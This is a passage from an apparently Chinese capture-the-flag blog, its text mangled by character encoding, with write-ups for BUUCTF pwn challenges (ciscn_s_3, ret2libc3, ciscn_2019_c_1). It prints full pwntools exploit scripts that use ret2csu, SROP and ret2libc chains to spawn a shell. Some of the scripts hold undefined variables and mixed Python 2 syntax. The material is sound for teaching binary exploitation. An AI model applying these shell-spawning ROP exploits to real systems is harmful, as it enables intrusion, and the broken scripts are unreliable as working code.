<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">ret_addr = <span class="number">0x4003a9</span></span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"><span class="comment">#buf_addr = stack_addr-0x118</span></span><br><span class="line">buf_addr = stack_addr-<span class="number">0x148</span></span><br></pre></td></tr></table></figure>



<h2 id="0x03-4"><a href="#0x03-4" class="headerlink" title="0x03"></a>0x03</h2><h3 id="ç¬¬ä¸€ç§åšæ³•ï¼šret2csuæ§åˆ¶æ‰§è¡Œexecve"><a href="#ç¬¬ä¸€ç§åšæ³•ï¼šret2csuæ§åˆ¶æ‰§è¡Œexecve" class="headerlink" title="ç¬¬ä¸€ç§åšæ³•ï¼šret2csuæ§åˆ¶æ‰§è¡Œexecve"></a>ç¬¬ä¸€ç§åšæ³•ï¼šret2csuæ§åˆ¶æ‰§è¡Œexecve</h3><p>__libc_csu_init       ï¼ˆå…·ä½“å¯ä»¥çœ‹<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/">ctf-wiki</a>ä¸­çš„ä»‹ç»ï¼‰</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308082004182.png" alt="image-20230808200450127"></p>
<p>éœ€è¦å°†å„å¯„å­˜å™¨ç½®ä¸ºï¼š rax  0x3B  rdi &#x3D; â€˜&#x2F;bin&#x2F;shâ€™ rsi &#x3D; 0 rdx &#x3D; 0</p>
<p>ROPgadget èƒ½æ‰¾åˆ°æ§åˆ¶rdiå’Œrsiçš„ï¼Œä»¥åŠsyscall  ï¼ˆä¸è¿‡å®é™…ä¸Šæ²¡æœ‰ç”¨rsiçš„ï¼Œå› ä¸ºcsuä¸­æœ‰pop r14å’Œmov rsi, r14æŒ‡ä»¤ï¼Œå¯ä»¥é€šè¿‡æ ˆä¸Šå¸ƒç½®å°†rsiç½®ä¸º0ï¼‰</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308082024016.png" alt="image-20230808202429992"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308082008232.png" alt="image-20230808200850211"></p>
<p>ç°åœ¨è¿˜è¦æƒ³åŠæ³•æ§åˆ¶rdx</p>
<p>é€šè¿‡__libc_csu_initå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ‰§è¡Œpop r13ç„¶åå†æ‰§è¡Œmov rdx, r13å°†rdxç½®ä¸º0</p>
<p>åŒæ—¶è¿˜è¦æ³¨æ„ï¼š </p>
<ol>
<li>0x400589: call [r12 + rbx * 8], ä¼šæ‰§è¡Œr12+rbx<em>8åœ°å€æŒ‡å‘çš„å‡½æ•°ï¼Œä¸è¿‡è¿™é‡Œæ²¡æœ‰éœ€è¦æ‰§è¡Œçš„å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥åœ¨bufé‡Œæ”¾äº†ä¸ªret;çš„åœ°å€â€¦, ç„¶åè®©r12 + rbx</em>8æŒ‡å‘bufï¼›callå‡½æ•°ä¹‹å‰ä¼šè‡ªåŠ¨å°†ä¸‹ä¸€æ¡æŒ‡ä»¤å…¥æ ˆï¼Œæ¥ç€æ‰§è¡Œretåˆ™rspæŒ‡é’ˆç›¸å½“äºä¸å˜</li>
<li>cmp rbx, rbp; jnz short loc_400580, å¦‚æœrbxå’Œrbpç›¸åŒä¼šå¾ªç¯ã€‚æƒ³è¦ç»•è¿‡éœ€è¦ä½¿ rbx &#x3D; 0  rbp &#x3D; 1 </li>
<li>æ³„éœ²å‡½æ•°åœ°å€åç›´æ¥é‡è¿›çš„vulå‡½æ•°ï¼Œbufçš„åœ°å€ä¸å˜</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">syscall = <span class="number">0x400501</span></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">ret_addr = <span class="number">0x4003a9</span></span><br><span class="line"></span><br><span class="line">payload = p64(ret_addr) + <span class="string">b&#x27;/bin/sh\0&#x27;</span><span class="comment">#ä¸ºä¹‹åå‡½æ•°è·³è½¬å’Œä¼ å…¥binshåšå‡†å¤‡</span></span><br><span class="line">payload += p64(<span class="number">0x4004e2</span>) <span class="comment"># rax=0x3b</span></span><br><span class="line">payload += p64(<span class="number">0x40059a</span>) <span class="comment"># 6ä¸ªpop</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># rbx = 0, rbp = 1</span></span><br><span class="line">payload += p64(buf_addr) + p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># r12 = buf_addrï¼Œr13 r14 r15 = 0</span></span><br><span class="line">payload += p64(<span class="number">0x400580</span>)         <span class="comment">#æ‰§è¡Œå¯„å­˜å™¨r12æŒ‡å‘çš„å‡½æ•°  ï¼ˆä¹Ÿå°±æ˜¯retï¼‰ï¼›æŠŠrdxè®¾ä¸º0            </span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span> <span class="comment"># è¿™é‡Œæ‰§è¡Œåˆ°0x400596ååˆä¼šé‡æ–°popä¸€é, å¼€å¤´æ‰§è¡Œadd rsp, 8è®©rspè·³è¿‡äº†æ ˆä¸Šçš„ä¸€ä¸ªæ•°æ®ï¼Œå¦‚ä½•æ‰§è¡Œ6popï¼Œæ‰€ä»¥æ ˆä¸Šå¸ƒç½®7ä¸ª0</span></span><br><span class="line">payload += p64(pop_rdi) + p64(buf_addr + <span class="number">8</span>) <span class="comment"># rdi = &amp;&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="ç¬¬äºŒç§ï¼šSROP"><a href="#ç¬¬äºŒç§ï¼šSROP" class="headerlink" title="ç¬¬äºŒç§ï¼šSROP"></a>ç¬¬äºŒç§ï¼šSROP</h3><p>å…·ä½“å¯å‚è€ƒ<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">ctf-wiki</a></p>
<p>æœ¬é¢˜è§£æ³•å¯å‚è€ƒ<a href="https://www.cnblogs.com/wudiiv11/p/buuctf-ciscn_2019_s_3.html#:~:text=%E8%A7%A3%E6%B3%952%20sigret-,%E5%8E%9F%E7%90%86,-linux%E5%A4%84%E7%90%86signal">è¿™ç¯‡åšå®¢</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = buf_addr</span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(<span class="number">0x4004da</span>) + p64(syscall) + <span class="built_in">bytes</span>(sigframe)</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨pwntoolsçš„sigframeæ¨¡å—å³å¯</p>
<p>å…¶å®è¿™ä¸¤ç§è§£æ³•éƒ½æ˜¯ä»¥ç¨‹åºè¯»å…¥è¶³å¤Ÿå¤šçš„å­—èŠ‚ä¸ºæ¡ä»¶çš„</p>
<p>å®Œæ•´exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>] </span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,29591)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">syscall = <span class="number">0x400501</span></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">ret_addr = <span class="number">0x4003a9</span></span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"><span class="comment">#buf_addr = stack_addr-0x118</span></span><br><span class="line">buf_addr = stack_addr-<span class="number">0x148</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">payload = p64(ret_addr) + <span class="string">b&#x27;/bin/sh\00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x4004e2</span>) <span class="comment"># rax=0x3b</span></span><br><span class="line">payload += p64(<span class="number">0x40059a</span>) <span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># rbx = 0, rbp = 1</span></span><br><span class="line">payload += p64(buf_addr) + p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># r12 = buf_addr</span></span><br><span class="line">payload += p64(<span class="number">0x400580</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(buf_addr + <span class="number">8</span>) <span class="comment"># rdi = &amp;&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"><span class="comment">#payload += p64(vul_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sigframe = SigreturnFrame()</span></span><br><span class="line"><span class="string">sigframe.rax = constants.SYS_execve</span></span><br><span class="line"><span class="string">sigframe.rdi = buf_addr</span></span><br><span class="line"><span class="string">sigframe.rsi = 0x0</span></span><br><span class="line"><span class="string">sigframe.rdx = 0x0</span></span><br><span class="line"><span class="string">sigframe.rip = syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = b&#x27;/bin/sh\0&#x27;.ljust(0x10, b&#x27;a&#x27;) + p64(0x4004da) + p64(syscall) + bytes(sigframe)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2libc3åˆé›†</title>
    <url>/posts/be5100f9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>ç›®å‰ä¸€äº›æ¯”è¾ƒç»å…¸çš„ret2libc2çš„æ€»åˆé›†ï¼ŒåŒ…æ‹¬32ä½å’Œ64ä½ï¼Œæœ‰libcæ–‡ä»¶å’Œæ²¡æœ‰libcæ–‡ä»¶</p>
<span id="more"></span>

<p>ctf-wiki ret2libc3<br>è€ƒç‚¹ï¼šæ ˆæº¢å‡ºrop</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec â€”â€” 32-bit å¼€NX</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081254951.png"></p>
<p>æ¼æ´å’Œå†…å­˜åˆ†æå’Œä¹‹å‰çš„ç³»åˆ—é¢˜ç±»ä¼¼ï¼Œä¸èµ˜è¿°äº†</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAçœ‹æºç ï¼Œæ—¢æ²¡æœ‰systemä¹Ÿæ²¡æœ‰binsh </p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081256604.png" alt="image-20230808125622556"></p>
<p>ç”±linuxå»¶è¿Ÿç»‘å®šæœºåˆ¶çš„çŸ¥è¯†ï¼ˆåé¢å†å†™ä¸€ç¯‡æ€»ç»“å§ï¼‰å¯çŸ¥ï¼Œæˆ‘ä»¬å¦‚æœè¦è°ƒç”¨systemå‡½æ•°ï¼Œå°±è¦çŸ¥é“ä»–çš„gotè¡¨ä¸­çš„åœ°å€ï¼Œä½†libcè¢«åŠ è½½åˆ°çš„å†…å­˜çš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬æ— æ³•å¾—çŸ¥<br>ä¸è¿‡ï¼ŒåŒä¸€ç‰ˆæœ¬çš„libcçš„ä¸¤ä¸ªåº“å‡½æ•°åœ¨libcä¸­çš„ç›¸å¯¹ä½ç½®æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„gotè¡¨åœ°å€ï¼Œç„¶åç¡®å®šlibcçš„ç‰ˆæœ¬ï¼Œå°±å¯ä»¥åŠ ä¸Šå’Œsystemå‡½æ•°çš„åç§»ï¼Œä»è€Œå¾—åˆ°systemå‡½æ•°çš„çœŸå®åœ°å€ï¼ˆgotè¡¨åœ°å€ï¼‰<br>è€Œç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªputså‡½æ•°ï¼Œlibcä¸­ä¹Ÿæœ‰systemå’Œbinsh</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>æˆ‘ä»¬åªéœ€è¦é€šè¿‡æ ˆæº¢å‡ºåˆ©ç”¨putså‡½æ•°ï¼Œæ‰“å°putså‡½æ•°çš„gotè¡¨ä¸­çš„åœ°å€ï¼Œç„¶åè·å–åç§»ï¼Œå¾—åˆ°systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå†å°†putså‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºsystemå‡½æ•°çš„åœ°å€å³å¯<br>æˆ‘ä»¬å¯ä»¥å…ˆè¿è¡Œexp1ï¼ˆè§0x04ï¼‰æ‹¿åˆ°è·å–putsçš„çœŸå®åœ°å€ï¼Œç„¶åå»<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -searchçš„ç½‘ç«™</a>æŸ¥è¯¢ï¼Œå¯å¾—åˆ°putså‡½æ•°systemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²å¯¹åº”çš„åç§»åœ°å€</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081257190.png" alt="image-20230808125734100"></p>
<p>çŸ¥é“äº†putså‡½æ•°çš„çœŸå®åœ°å€å’Œåç§»ä¹‹åï¼Œå°±å¯ä»¥å°†putså‡½æ•°çš„çœŸå®åœ°å€å‡å»åç§»åœ°å€ï¼Œå¾—åˆ°libcçš„åŸºå€ï¼Œå°†libcçš„åŸºå€åˆ†åˆ«ä¸systemï¼Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„åç§»ç›¸åŠ ï¼Œå°±å¯ä»¥å¾—åˆ°å¯¹åº”çš„çœŸå®åœ°å€<br>ç„¶åå†™å®Œæ•´çš„exp </p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>æ‰€ä»¥å…¶å®expæ˜¯åˆ†ä¸¤éƒ¨çš„ï¼Œç¬¬ä¸€æ­¥æ˜¯æ„é€ æ ˆæº¢å‡ºåˆ©ç”¨putså‡½æ•°æ‰“å°å‡ºçœŸå®åœ°å€ï¼›ç¬¬äºŒæ­¥æ˜¯æº¢å‡ºè¦†ç›–è‡³systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œæ‹¿åˆ°shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#first exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;ret2libc3&#x27;)</span><br><span class="line">p=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line">print(&quot;puts addr = &quot;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#second exp</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(&quot;puts_addr = &quot;,hex(puts_addr))</span><br><span class="line">sys_offset = 0x03cd10</span><br><span class="line">puts_offset = 0x067360</span><br><span class="line">sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">#æ ¹æ®å…¬å¼  libcåŸºåœ°å€  +  å‡½æ•°åç§»é‡   =  å‡½æ•°çœŸå®åœ°å€   æ¥è®¡ç®—</span><br><span class="line">libc_base_addr = puts_addr - puts_offset #è®¡ç®—å‡ºlibcåŸºåœ°å€</span><br><span class="line">sys_addr = libc_base_addr + sys_offset #è®¡ç®—å‡ºsystemçš„çœŸå®åœ°å€</span><br><span class="line">sh_addr = libc_base_addr + sh_offset #è®¡ç®—å‡º/bin/shçš„çœŸå®åœ°å€</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))</span><br><span class="line">print(&quot;sys_addr = &quot;,hex(sys_addr))</span><br><span class="line">print(&quot;sh_addr = &quot;,hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…å†™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>

<h3 id="ä¸€å®šæ³¨æ„å‘é€payå‰æ¥æ”¶çš„å†…å®¹"><a href="#ä¸€å®šæ³¨æ„å‘é€payå‰æ¥æ”¶çš„å†…å®¹" class="headerlink" title="ä¸€å®šæ³¨æ„å‘é€payå‰æ¥æ”¶çš„å†…å®¹"></a>ä¸€å®šæ³¨æ„å‘é€payå‰æ¥æ”¶çš„å†…å®¹</h3><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>æœç´¢libcå¸¸ç”¨æ–¹æ³•ï¼š</p>
<ul>
<li><p>LibcSearcher</p>
</li>
<li><p>ç½‘ç«™æŸ¥æ‰¾ <a href="https://libc.rip/">libc-database</a><br><a href="https://libc.blukat.me/?q=_rtld_global:0">llibc database search</a></p>
</li>
<li><p>libc-database</p>
</li>
<li><p>å‚è€ƒèµ„æ–™ï¼š<br><a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwnå°ç™½å…¥é—¨06â€“ret2libc</a><br><a href="https://blog.csdn.net/AcSuccess/article/details/104335514">åŸºæœ¬ROPä¹‹ret2libc3</a><br><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichenäºŒè¿›åˆ¶å®‰å…¨</a></p>
<p><a href="https://www.jianshu.com/p/83f55c55c173">å¯¹äºè¿”å›åœ°å€ä¸åŒè€Œå¯¼è‡´çš„è¾“å…¥åç§»ä¸åŒ</a></p>
</li>
</ul>
<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>ç®€å•çš„ret2libc3<br>file checksec â€”â€” 64-bit å¼€NX</p>
<h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>è¿è¡Œä¸€ä¸‹çœ‹çœ‹</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915622.webp"></p>
<p>å†çœ‹çœ‹IDA</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081258517.png"></p>
<p>ç ”ç©¶äº†åŠå¤©å‘ç°æ˜¯è®©ä½ åŠ è§£å¯†çš„<br>å†çœ‹çœ‹string window æ²¡ç”¨systemå’Œbinsh<br>åˆå‘ç°åŠ å¯†å‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œå¯æ„æˆæ ˆæº¢å‡º</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915382.png"></p>
<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>åˆ†æå¤§è‡´æµç¨‹å°±æ˜¯</p>
<ol>
<li>åˆ©ç”¨ä¸€ä¸ªç¨‹åºå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°å»æ³„éœ²å®ƒåœ¨ç¨‹åºä¸­çš„åœ°å€ï¼Œç„¶åå–æœ«å°¾3ä¸ªå­—èŠ‚ï¼Œå»æ‰¾åˆ°è¿™ä¸ªç¨‹åºæ‰€ä½¿ç”¨çš„libcçš„ç‰ˆæœ¬</li>
<li>ç”¨åŒä¸€ä¸ªç¨‹åºé‡Œå‡½æ•°çš„åœ°å€-libcé‡Œçš„å‡½æ•°åœ°å€å³å¯å¾—åˆ°åç§»é‡</li>
<li>å¾—åˆ°åç§»é‡åå°±å¯ä»¥æ¨ç®—å‡ºç¨‹åºä¸­å…¶ä»–å‡½æ•°çš„åœ°å€ï¼ŒçŸ¥é“å…¶ä»–å‡½æ•°çš„åœ°å€ä¹‹åå°±å¯ä»¥å»æ‰§è¡Œsystemï¼ˆâ€™&#x2F;bin&#x2F;shâ€˜ï¼‰</li>
</ol>
<h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>å†™exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28342)</span><br><span class="line">elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)</span><br><span class="line"></span><br><span class="line">main=0x400b28</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>çš„githubç½‘å€<br>å®‰è£…</p>
<blockquote>
<p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p>
</blockquote>
<p>è¦†ç›–æ•°æ®payload&#x3D;bâ€™\0â€™+bâ€™aâ€™*(0x50-1+8)<br>\0æ˜¯ä¸ºäº†è®©åŠ å¯†å‡½æ•°çš„ä¸€ä¸ªstrlenå‡½æ•°åœæ­¢ï¼ˆè¿™ä¸ªå‡½æ•°é‡â€˜0â€™ä¼šåœæ­¢ï¼‰ï¼Œä»è€Œç»•è¿‡åŠ å¯†ï¼Œä¿è¯æˆ‘ä»¬æ„é€ çš„ropä¸ä¼šè¢«ç ´åï¼Œ<br>bufçš„å¤§å°ä¸º0x50<br>-1æ˜¯å‡å»\0<br>+8æ˜¯è¦†ç›–rbp</p>
<p>è¿™é“é¢˜çš„æ¥æ”¶éå¸¸è®²ç©¶<br>æ³„éœ²åœ°å€æ¥æ”¶æ—¶å…ˆæ˜¯ä¸¤ä¸‹recvline()ï¼Œ<br>åŸå› </p>
<blockquote>
<p>recvline()ä¸€æ¬¡æ¥æ”¶åˆ°\n;<br>ç¬¬ä¸€æ¬¡recvlineåªèƒ½åˆ°Ciphertextï¼›<br>ç¬¬äºŒæ¬¡åªèƒ½æ¥æ”¶åˆ°0a<br>ç¬¬ä¸‰æ¬¡çš„recvuntilæ‰å¼€å§‹å¤„ç†æ³„éœ²çš„gotåœ°å€ã€‚<br>å…ˆå¼€ä¸€ä¸‹context_log_lever&#x3D;â€™debugâ€™ï¼Œæ•´ä½“çœ‹ä¸€ä¸‹ï¼Œ å†è‡ªå·±recvuntilçœ‹èƒ½æ¥æ”¶åˆ°ä»€ä¹ˆå†…å®¹ã€‚</p>
</blockquote>
<p>ç„¶åå†ç”¨recvuntil(â€˜\nâ€™)[:-1].ljust(8,â€™\0â€™)æ¥èˆå¼ƒæ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²æœ€åçš„â€™\x0â€™å¹¶å‘å·¦è¡¥é½</p>
